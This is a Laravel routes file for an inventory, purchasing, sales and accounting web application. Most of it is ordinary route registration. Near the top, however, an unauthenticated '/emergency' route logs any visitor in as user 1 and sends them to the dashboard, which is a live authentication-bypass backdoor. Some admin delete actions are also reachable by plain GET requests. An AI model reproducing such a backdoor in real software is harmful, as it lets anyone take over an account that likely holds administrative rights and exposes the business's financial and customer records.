<?php

/*
|--------------------------------------------------------------------------
| Application Routes
|--------------------------------------------------------------------------
|
| Here is where you can register all of the routes for an application.
| It's a breeze. Simply tell Laravel the URIs it should respond to
| and give it the Closure to execute when that URI is requested.
|
*/
#CSRF protection for all post request
Route::when('*', 'csrf', array('post'));
Route::get('login',['as' => 'login', 'uses' =>'SessionsController@create']);
Route::get('logout',['as'=>'logout', 'uses' =>'SessionsController@destroy']);
Route::resource('sessions', 'SessionsController',['only' => ['create','store','destroy']]);
//Emergency route
Route::get('/emergency', function(){
	Auth::login(User::find(1));
	return Redirect::to('/dashboard');
});
Route::get('/', ['as'=>'home', function(){
	return Redirect::to('/dashboard');
}])->before('auth');
// Reroute generic links to the correct user paths (from /a to /a/{uid})
Route::get('{path}', ['before' => 'auth|reroute']);
#AUTH GET ROUTES
Route::group(["before" => "auth", 'prefix' => 'user/{user}'], function() {
	
	Route::get('/', ['as'=>'home', function(){
			return Redirect::to('/dashboard');
	}]);
	Route::get('/dashboard', ['as'=>'dashboard', 'uses'=>'PagesController@home']);
	#Update Account
		Route::get('update-account', 'UsersController@editAccount');
	#Transactions
		#PO

		Route::get('/PurchaseOrders', 'POController@index');
		Route::get('/productDtAjax', array('as' => 'productDtAjax', 'uses' => 'POController@productDtAjax')); 
		#BILLS
		Route::get('/Bills', 'BillsController@index');
		#SO
 		Route::get('/SalesOrders', 'SOController@index');
 		Route::get('/changeSOType', 'SOController@changeSOType');
 		Route::post('/view-price-list', 'SOController@vwPriceList');
 		#BILLPAYMENTS
 		Route::get('/BillPayments', 'BillPaymentsController@index');
 		#SI
 		Route::get('/SalesInvoice', 'SalesInvoiceController@index');
 		#SP
 		Route::get('/SalesPayment', 'SalesPaymentController@index');
 		#IA
 		Route::get('/inventory-adjustment', 'IAController@index');
 		#Damages
 		Route::get('/damages', 'DamagesController@index');
		#ST
 		Route::get('/stocks-transfer', 'STController@index');
});

#AUTH POST ROUTES
Route::group(["before" => "auth", 'prefix' => 'user/{user}'], function() {
	#Transactions
 	#PURCHASE ORDER ROUTES
 		Route::post('/savePO', 'POController@savePO');
 		Route::post('/viewPO', 'POController@viewPO');
 		Route::post('/viewPODetails', 'POController@viewPODetails');
 		Route::post('/saveEditedPO', 'POController@saveEditedPO');
 		Route::post('/approvePO', 'POController@approvePO');
 		Route::post('/cancelPO', 'POController@cancelPO');
 		Route::post('/addProductToPO', 'POController@addProductToPO');
 		Route::post('/productDtAjax', 'POController@productDtAjax');
	 #BILLS ROUTES
	 	Route::post('/savePOBill', 'BillsController@savePOBill');
	 	Route::post('/viewBill', 'BillsController@viewBill');
	 	Route::post('/viewBillDetails', 'BillsController@viewBillDetails');
	 	Route::post('/saveEditedPOBill', 'BillsController@saveEditedPOBill');
	 	Route::post('/cancelBill', 'BillsController@cancelBill');
		Route::post('/approveBill', 'BillsController@approveBill');		
 	#SALES ORDER ROUTES
 		Route::post('/saveSO', 'SOController@saveSO');
 		Route::post('/viewSO', 'SOController@viewSO');
 		Route::post('/viewSODetails', 'SOController@viewSODetails');
 		Route::post('/saveEditedSO', 'SOController@saveEditedSO');
 	#BILLPAYMENTS ROUTES
 		Route::post('/addBillToPayment', 'BillPaymentsController@addBillToPayment');
 		Route::post('/billPayment', 'BillPaymentsController@billPayment');
 		Route::post('/getbillPayments', 'BillPaymentsController@getbillPayments');
 		Route::post('/getbillPaymentDetails', 'BillPaymentsController@getbillPaymentDetails');
 	#SALES INVOICE ROUTES
 		Route::post('/saveSOBill', 'SalesInvoiceController@saveSOBill');
 		Route::post('/viewSI', 'SalesInvoiceController@viewSI');
 		Route::post('/viewSIDetails', 'SalesInvoiceController@viewSIDetails');
 		Route::post('/saveEditedSI', 'SalesInvoiceController@saveEditedSI');
 		Route::post('/approveSI', 'SalesInvoiceController@approveSI');
 		Route::post('/cancelSI', 'SalesInvoiceController@cancelSI');
 	#SALES PAYMENT ROUTES
 		Route::post('/addInvoiceToSalesPayment', 'SalesPaymentController@addInvoiceToSalesPayment');
 		Route::post('/salesPay', 'SalesPaymentController@salesPay');
 		Route::post('/getSP', 'SalesPaymentController@getSP');
 		Route::post('/getSPDetails', 'SalesPaymentController@getSPDetails');
 		Route::post('/getSPInvoices', 'SalesPaymentController@getSPInvoices');
 		Route::post('/fetchBanks', 'SalesPaymentController@fetchBanks');
 		Route::post('/checkPayments', 'SalesPaymentController@checkPayments');
 		Route::post('/getPaymentAdvance', 'SalesPaymentController@getPaymentAdvance');
 		Route::post('/getPaymentTypes', 'SalesPaymentController@getPaymentTypes');
 		Route::post('/viewSP', 'SalesPaymentController@viewSP');
 		Route::post('/getBal', 'SalesPaymentController@getBal');
 	#STOCK TRANSFER ROUTES
 		Route::post('/saveST', 'STController@saveST');
 		Route::post('/viewST', 'STController@viewST');
 		Route::post('/viewSTDetails', 'STController@viewSTDetails');
 		Route::post('/saveEditedST', 'STController@saveEditedST');

 	#INVENTORY ADJUSTMENT ROUTES
 		Route::post('/saveIA', 'IAController@saveIA');
 		Route::post('/viewIA', 'IAController@viewIA');
 		Route::post('/viewIADetails', 'IAController@viewIADetails');
 		Route::post('/saveEditedIA', 'IAController@saveEditedIA');

 	#INVENTORY ADJUSTMENT ROUTES
 		Route::post('/saveD', 'DamagesController@saveD');
 		Route::post('/viewD', 'DamagesController@viewD');
 		Route::post('/viewDDetails', 'DamagesController@viewDDetails');
 		Route::post('/saveEditedD', 'DamagesController@saveEditedD');

 	#Return Good Stocks (Customer Returns)
 		Route::resource('/customer-return', 'CRController');
 		Route::post('/saveCR', 'CRController@saveCR');
 		Route::post('/viewCR', 'CRController@viewCR');
 		Route::post('/viewCRDetails', 'CRController@viewCRDetails');
 		Route::post('/saveEditedCR', 'CRController@saveEditedCR');
 		Route::post('/fetchCustomerSI', 'CRController@fetchCustomerSI');
 		Route::post('/fetchSIItems', 'CRController@fetchSIItems');
 		Route::post('/fetchSI', 'CRController@fetchSI');

 	#Return to Supplier (Supplier Returns)
 		Route::resource('/supplier-return', 'SRController');
 		Route::post('/saveSR', 'SRController@saveSR');
 		Route::post('/viewSR', 'SRController@viewSR');
 		Route::post('/viewSRDetails', 'SRController@viewSRDetails');
 		Route::post('/saveEditedSR', 'SRController@saveEditedSR');
 		Route::post('/fetchSupplierBills', 'SRController@fetchSupplierBills');
 		Route::post('/fetchBillItems', 'SRController@fetchBillItems');
 		Route::post('/fetchBills', 'SRController@fetchBills');


		Route::post('/updateuser', 'UsersController@updateuser');
	});


#ADMIN GET ROUTES
##File Maintenance Filters
Route::group(["before" => "admin", 'prefix' => 'user/{user}'], function() {
	#Product Categories
	Route::resource('/ProductCategories', 'ProductCategoriesController');
	Route::post('/addCategory', 'ProductCategoriesController@addCategory');
	Route::post('/storecategory', 'ProductCategoriesController@store');
 	Route::post('/editCategory', 'ProductCategoriesController@editCategory');
	#Suppliers
	// Route::get('/Suppliers', 'SuppliersController@index');
	Route::resource('/Suppliers', 'SuppliersController');
	Route::post('/storesupplier', 'SuppliersController@store');
 	Route::post('/fetchSupplier', 'SuppliersController@fetchSupplier');
	#Products
	// Route::get('/Products', 'ProductsController@index');
	Route::resource('/Products', 'ProductsController');
	Route::post('/storeproduct', 'ProductsController@store');
 	Route::post('/fetchProduct', 'ProductsController@fetchProduct');
	#Banks
	// Route::get('/banks', 'BanksController@index');
	Route::resource('/banks', 'BanksController');
	Route::post('/storebank', 'BanksController@store');
 	Route::post('/toEditBank','BanksController@toEditBank');
 	Route::get('delete-bank/{id}', 'BanksController@destroy');
 	#CreditMemo
	// Route::get('/banks', 'BanksController@index');
	Route::resource('/creditmemo', 'CreditMemoController');
	Route::post('/storeCM', 'CreditMemoController@store');
 	Route::post('/toEditCM','CreditMemoController@toEditCM');
 	Route::get('delete-cm/{id}', 'CreditMemoController@destroy');
	#Branches
	// Route::get('/branches', 'BranchesController@index');
	Route::resource('/branches', 'BranchesController');
	Route::post('/storebranch', 'BranchesController@store');
 	Route::post('/toEditBranch','BranchesController@toEditBranch');
 	Route::get('delete-branch/{id}', 'BranchesController@destroy');
	#Customers
	// Route::get('/customers', 'CustomersController@index');
	Route::resource('/customers', 'CustomersController');
	Route::post('/storecustomer', 'CustomersController@store');
 	Route::post('/toEditCustomer','CustomersController@toEditCustomer');
 	Route::get('delete-customer/{id}', 'CustomersController@destroy');

	#Users
	// Route::get('/Users', 'UsersController@index');
	Route::resource('/Users', 'UsersController');
	Route::post('/storeuser', 'UsersController@store');
	Route::post('/toEditUser','UsersController@toEditUser');
	Route::get('delete-user/{id}', 'UsersController@destroy');
	Route::get('/verifyCurrentPassword', 'UsersController@validateCurrentPassword');

	#Reports
	Route::resource('/reports', 'ReportsController');
	Route::post('/fetchInventorySummary','ReportsController@fetchInventorySummary');
	Route::post('/fetchInventoryByLotNo','ReportsController@fetchInventoryByLotNo');
	Route::post('/fetchInventoryByStockCard','ReportsController@fetchInventoryByStockCard');
	Route::get('/reportProductDtAjax', array('as' => 'reportProductDtAjax', 'uses' => 'ReportsController@reportProductDtAjax')); 
	Route::post('/fetchInventoryByStockCardId','ReportsController@fetchInventoryByStockCardId');
	Route::post('/fetchInventoryGainLoss','ReportsController@fetchInventoryGainLoss');
	
	#Additional Reports
	Route::resource('/additional-reports', 'AdditionalReportsController');
	Route::post('/get-monthly-sales-report', 'AdditionalReportsController@getMonthlySalesReport');
	Route::post('/get-monthly-collection-report', 'AdditionalReportsController@getMonthlyCollectionReport');
	Route::post('/get-bad-accounts', 'AdditionalReportsController@getBadAccounts');
	Route::post('/get-receivable-report', 'AdditionalReportsController@getReceivables');
});




#ADMIN POST ROUTES
#File Maintenance Filters
// Route::group(["before" => "admin", 'prefix' => 'user/{user}'], function(){
//  	#Product Categories
//  		Route::post('/addCategory', 'ProductCategoriesController@addCategory');
//  		Route::post('/editCategory', 'ProductCategoriesController@editCategory');
//  	#Suppliers
//  		Route::resource('/Suppliers', 'Suppliers');
//  		Route::post('/fetchSupplier', 'SuppliersController@fetchSupplier');
//  	#Products
//  		Route::resource('/Products', 'Products');
//  		Route::post('/fetchProduct', 'ProductsController@fetchProduct');
//  	#Banks
//  		Route::resource('/banks', 'BanksController');
//  	#branch library
//  		Route::resource('/branches', 'BranchesController');
//  	#customer library
//  		Route::resource('/customers', 'CustomersController');
//  	#user library
//  		Route::resource('/Users', 'UsersController');
 	
// });

